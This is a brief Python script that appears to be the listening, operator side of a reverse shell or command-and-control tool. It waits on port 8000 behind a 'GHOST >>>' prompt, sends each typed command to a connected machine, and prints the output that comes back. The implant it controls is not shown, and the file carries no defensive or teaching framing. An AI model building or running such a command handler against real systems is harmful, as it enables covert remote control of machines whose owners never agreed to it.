import socket 

try:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    HOST = "0.0.0.0"
    PORT = 8000

    s.bind((HOST, PORT))

    print("Looking For Connections")

    s.listen(1)
    conn, addr = s.accept()

    print(f"Connected With {addr}")

except Exception as e:
    print(f"Some Problem occurred {e}")


while True:
    try:
        cmd = input("GHOST >>> ")
        if not cmd:
            continue

        elif cmd == "exit":
            conn.send(cmd.encode())
            print("Connection Disconnected")
            break
            
        else:
            print("task Completed")
            conn.send(cmd.encode())
            sysmsg = conn.recv(5000).decode()
            print(sysmsg)


    except Exception as f:
        print(f"Connection Error : {f}")
        break
